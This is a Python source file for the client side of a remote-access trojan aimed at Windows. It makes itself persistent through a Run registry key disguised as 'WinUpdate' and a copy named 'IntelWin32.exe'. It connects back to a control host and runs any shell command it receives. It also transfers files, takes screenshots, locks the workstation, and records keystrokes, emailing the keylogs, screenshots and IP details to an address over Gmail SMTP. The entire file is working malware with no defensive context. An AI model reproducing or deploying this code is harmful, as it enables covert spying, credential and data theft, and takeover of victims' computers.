import subprocess
import os
import requests
import time
import socket
import shutil
import json
import sys
import pyscreeze
import platform
import ctypes
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import smtplib
from io import BytesIO
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener


HOST = "192.168.1.35"
PORT = 6666
BUFF = 1024


def become_persistent():
    _evil_file_location_ = os.environ["appdata"] + "\\IntelWin32.exe"
    if not os.path.exists(_evil_file_location_):
        shutil.copyfile(sys.executable, _evil_file_location_)
        regedit_command = f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WinUpdate /t REG_SZ /d {_evil_file_location_}"
        subprocess.call(regedit_command, shell=True)

def connect():
    global objSocket, objEncryptor
    while True:
        try:
            objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            objSocket.connect((HOST, PORT))
        except socket.error:
            time.sleep(5)
        else:
            break


def send_client_info():
    global objEncryptor, objSocket
    arrClientInfo = [socket.gethostname()]
    strPlatform = f"{platform.system()} {platform.release()}"
    arrClientInfo.extend([strPlatform, os.environ["USERNAME"]])

    objSocket.send(json.dumps(arrClientInfo).encode())
    objEncryptor = Fernet(objSocket.recv(BUFF))


recv = lambda buffer: objEncryptor.decrypt(objSocket.recv(buffer))
send = lambda data: objSocket.send(objEncryptor.encrypt(data))

def recvall(buffer):
    bytData = b""
    while len(bytData) < buffer:
        bytData += objSocket.recv(buffer)
    return objEncryptor.decrypt(bytData)
def sendall(data):
    bytEncryptedData = objEncryptor.encrypt(data)
    intDataSize = len(bytEncryptedData)
    send(str(intDataSize).encode())
    time.sleep(0.2)
    objSocket.send(bytEncryptedData)

def receive(data):
    if not os.path.isfile(data):
        send(b"[-] Target file not found!")
        return

    with open(data, "rb") as objFile:
        sendall(objFile.read())

def download(data):
    intBuffer = int(data)
    file_data = recvall(intBuffer)
    strOutputFile = recv(BUFF).decode()
    print(strOutputFile)
    try:
        with open(strOutputFile, "wb") as objFile:
            objFile.write(file_data)
        response = "[+] Done!".encode()
    except Exception as e:
        print(e)
        response = "[-] Path is protected/invalid!".encode()
    return response

def upload(data):
    response = b""
    if not os.path.isfile(data):
        response = b"[-] Target file not found!"
    else:
        with open(data, "rb") as objFile:
            response = (objFile.read())  # Send Contents of File
    return response



def mail_config(mail="target@gmail.com"):
    host = "smtp.gmail.com"
    port = 465
    val = smtplib.SMTP_SSL(host, port)
    val.login("sender@gmail.com", "passw0rd!")

    msg = MIMEMultipart()
    msg['Subject'] = "Client Info"
    msg['From'] = "sender@gmail.com"
    msg['To'] = mail

    values = []
    values.append(val)
    values.append(msg)
    return values


timeIteration = 20  # 20 secs
count = 0
keys = []
currentTime = time.time()
stoppingTime = 0


def send_info_as_mail(email):
    if email == "":
        return b"[-] Invalid email address!"
    try:
        mail = mail_config(email)
        response = requests.get("https://api.ipify.org?format=json")
        public_ip = response.json()["ip"]
        processor = platform.processor()
        system_info = platform.system() + " " + platform.version()
        host_name = socket.gethostname()
        private_ip = socket.gethostbyname(host_name)
        txt = MIMEText("""
                                PUBLIC IP: {0}
                                PROCESSOR: {1}
                                SYSTEM:    {2}
                                HOST NAME: {3}
                                PRIVATE IP:{4}
                               """.format(public_ip, processor, system_info, host_name, private_ip))
        mail[1].attach(txt)

        _file = MIMEApplication(screenshot(),  _subtype="png")
        _file.add_header('Content-Disposition',
                         'attachment', filename="info.png")
        mail_config(email)[1].attach(_file)

        mail[0].send_message(mail[1])
        mail[0].quit()
        return b"[+] Success!"

    except Exception as e:
        return f"[-] Error! {e}".encode()


def send_keylogs_as_mail():

    if not os.path.isfile("logger.txt"):
        f = open("logger.txt", "w")
    mail = mail_config()
    txt = MIMEText("Log Message")
    mail[1].attach(txt)
    with open("logger.txt", "rb") as f:
        _file = MIMEApplication(f.read(), _subtype="txt")
    _file.add_header('Content-Disposition',
                     'attachment', filename="logger.txt")
    mail[1].attach(_file)
    mail[0].send_message(mail[1])
    mail[0].quit()


def keylogger():
    def on_press(key):
        global currentTime, count, keys
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()
        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open("logger.txt", "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        global currentTime, stoppingTime
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    global currentTime, stoppingTime, timeIteration
    while True:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
        send_keylogs_as_mail()
        send(b"[+] Give an order(start/stop).")
        order = recv(BUFF).decode()
        print(order)
        if order == "stop":
            break
        elif order == "continue" or order == "start":
            if currentTime > stoppingTime:
                with open("logger.txt", 'w') as f:
                    f.write(" ")
                currentTime = time.time()
                stoppingTime = currentTime + timeIteration


def lock():
    ctypes.windll.user32.LockWorkStation()
    response = b"[+] Locked!"
    return response


def screenshot():
    img = pyscreeze.screenshot()
    with BytesIO() as objBytes:
        # Save Screenshot into BytesIO Object
        img.save(objBytes, format="PNG")
        # Get BytesIO Object Data as fbytes
        ss = objBytes.getvalue()

    return ss


def run():
    while True:
        strCurrentDir = os.getcwd()
        order = recv(BUFF).decode()
        print(order)
        bytResponse = b""
        if order == "goback":
            os.chdir(strCurrentDir)
            bytResponse = f"\n{os.getcwd()}>".encode()
        elif order == "exit" or order == "quit":
            send("[+] Process is being terminated...")
            time.sleep(3)
            objSocket.close()
        elif order[:2] == "cd":
            if os.path.exists(order[3:]):
                os.chdir(order[3:])
                bytResponse = f"[+] Changing working directory to {os.getcwd()}>".encode(
                )
            else:
                bytResponse = "[-] Path not found!".encode()

        elif order[:4] == "send":
            bytResponse = download(order[4:])

        elif order[:4] == "recv":
            bytResponse = upload(order[4:])

        elif order[:4] == "lock":
            bytResponse = lock()

        elif order == "screenshot":
            bytResponse = screenshot()
        elif order[:4] == "mail":
            bytResponse = send_info_as_mail(order[5:])
        elif order == "keylogger":
            keylogger()

        elif len(order) > 0:
            objCommand = subprocess.Popen(
                order, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            strOutput = objCommand.stdout.read() + objCommand.stderr.read()
            bytResponse = strOutput

        else:
            bytResponse = b"[-] Error!"

        if not order == "keylogger":
            sendall(bytResponse)


def main():
    become_persistent()
    connect()
    send_client_info()
    run()


main()